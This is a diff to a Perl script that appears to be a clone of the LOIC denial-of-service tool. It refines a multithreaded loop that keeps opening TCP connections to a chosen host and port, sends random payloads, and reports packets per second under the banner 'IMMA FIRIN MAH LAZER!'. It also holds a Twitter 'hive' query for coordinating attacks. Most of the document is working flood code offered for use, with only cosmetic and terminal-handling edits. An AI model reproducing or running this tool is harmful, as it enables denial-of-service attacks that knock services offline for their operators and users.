@@ -9,6 +9,7 @@
 
 use strict;
 use warnings;
+use Term::ReadKey qw(ReadMode);
 use IO::Socket::INET;
 use Socket qw(IPPROTO_TCP TCP_NODELAY);
 use Number::Format;
@@ -19,9 +20,6 @@ use Config;
 use Games::Roguelike::Console;
 
 sub usage {
-	# Fail
-	print "" . chr(30) . "\n" . chr(30) . chr(30) . " ";
-
 	print "Usage: $0 [host[:port]]\n\n";
 
 	print "Port defaults to 80.\n";
@@ -43,11 +41,13 @@ srand;
 
 $SIG{PIPE} = 'IGNORE'; # ignore broken pipes
 
+our $con;
+
 our $THREADS = 0;
 if ($Config{usethreads}) {
-    use threads;
-    use threads::shared;
-    $THREADS = 1;
+	use threads;
+	use threads::shared;
+	$THREADS = 1;
 }
 
 our $HIVE_QUERY = "http://search.twitter.com/search.atom?q=loic";
@@ -94,20 +94,20 @@ usage unless $result;
 usage unless ($host ne "" && $port); # until hive functionality is added
 
 sub flood {
-    my $sock;
+	my $sock;
 
-    while (1) {
-        if (!$sock) {
-            $sock = new IO::Socket::INET(
-                PeerAddr => $host,
-                PeerPort => $port,
-                Timeout => $TCP_TIMEOUT,
-                Proto => "tcp",
-                Blocking => $block
-            );
+	while (1) {
+		if ((!defined $sock) || !$sock) {
+		    $sock = new IO::Socket::INET(
+				PeerAddr => $host,
+				PeerPort => $port,
+				Timeout => $TCP_TIMEOUT,
+				Proto => "tcp",
+				Blocking => $block
+			);
 		}
 
-        if ($sock) {
+		if (defined $sock && $sock) {
 			my $payload;
 
 			if ($tcp) {
@@ -115,80 +115,101 @@ sub flood {
 				$payload = map { chr(65 + rand(26)) } 0..6;
 			}
 
-            print $sock $payload;
+			print $sock $payload;
 
-            if ($SIG{__WARN__}) {
-                close $sock;
-            }
-            else {
+			if ($SIG{__WARN__}) {
+				close $sock;
+			}
+			else {
 				if ($tcp) {
 					$PACKETS += 4;
 				}
 				else {
 					$PACKETS++;
 				}
-            }
-        }
+			}
+		}
 
 		sleep $delay;
-    }
+	}
+}
+
+# Games::Rogulelike and Curses do not quit properly.
+sub reset_signals {
+	$SIG{INT} = sub {
+		undef $con;
+
+		# Allow terminal echo
+		if ($^O =~ /linux|darwin/) {
+			my $tty = POSIX::ttyname(1);
+			system "stty -f $tty icanon echo";
+
+			# Show the cursor
+			print "\e[?25h";
+		}
+
+		exit 0;
+	};
 }
 
 sub shoop {
-	my $con = Games::Roguelike::Console->new();
+	$con = Games::Roguelike::Console::ANSI->new;
+
+	# Force hide the cursor
+	if ($^O =~ /linux|darwin/) {
+		print "\e[?25l";
+	}
+
+	reset_signals;
 
 	my $width = $con->{winx};
-
+	
 	my $filler = "~" x ($width - 5);
 
-	$con->attrstr("white", 0, 1, "O");
-	$con->attrstr("bold red", 0, 2, "_");
-	$con->attrstr("white", 0, 3, "o");
-	$con->attrstr("bold red", 1, 1, "/");
-	$con->attrstr("bold red", 2, 0, "|");
-	$con->attrstr("white", 2, 2, "IMMA\' FIRIN\' MAH LAZER!");
-	$con->attrstr("bold red", 3, 1, "\\_");
-	$con->attrstr("white", 5, 0, "Press Control+C to quit.");
-	$con->refresh();
+	$con->addch(0, 1, "O");
+	$con->addch(0, 2, "_");
+	$con->addch(0, 3, "o");
+	$con->addch(1, 1, "/");
+	$con->addch(2, 0, "|");
+	$con->addch(3, 1, "\\_");
+	$con->addch(2, 2, "IMMA\' FIRIN\' MAH LAZER!");
+	$con->addch(5, 0, "Press Control+C to quit.");
+	$con->refresh;
 
 	my $startt = time;
 
-    if ($THREADS) {
-    	map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
+	if ($THREADS) {
+		map { my $t = threads->create(\&flood); $t->detach; } 1..$MAX_THREADS;
 	}
-    else {
-    	flood;
+	else {
+		flood;
 	}
 
 	my $interval = 0;
 
-	# protect against divide by zero
-	while ($interval < 1) {
-		$interval = time - $startt;
-	}
-
-	$con->attrstr("white", 2, 2, " " x ($width - 3)); # replace initial message
-
 	my $pps = 0;
+	my $message = "IMMA\' FIRIN\' MAH LAZER!";
 
 	while (1) {
-		my $endt = time;
-		$interval = $endt - $startt;
+		$interval = time - $startt;
 
-		if ($interval < 1) {}
-		elsif ($interval > $STAT_INTERVAL) {
-			$con->attrstr("blue", 1, 3, $filler);
-			$con->attrstr("white", 2, 2, uc "SENDING $host $pps PACKETS/SEC");
-			$con->attrstr("blue", 3, 3, $filler);
-			$con->refresh();
-
-			$startt = time;
-			$PACKETS = 0;
+		if ($interval < 3) {}
+		elsif ($PACKETS < 3) {
+			$message = "FAILED TO CONNECT TO $host:$port";
 		}
 		else {
+			$con->addch(1, 3, $filler);
+			$con->addch(3, 3, $filler);
+
 			$pps = $FORMATTER->format_number(int($PACKETS / $interval));
+			$message = "SENDING $host $pps PACKETS/SEC\n";
 		}
+
+		$con->addch(2, 2, uc $message);
+		$con->refresh;
 	}
+
+	undef $con;
 }
 
 shoop;
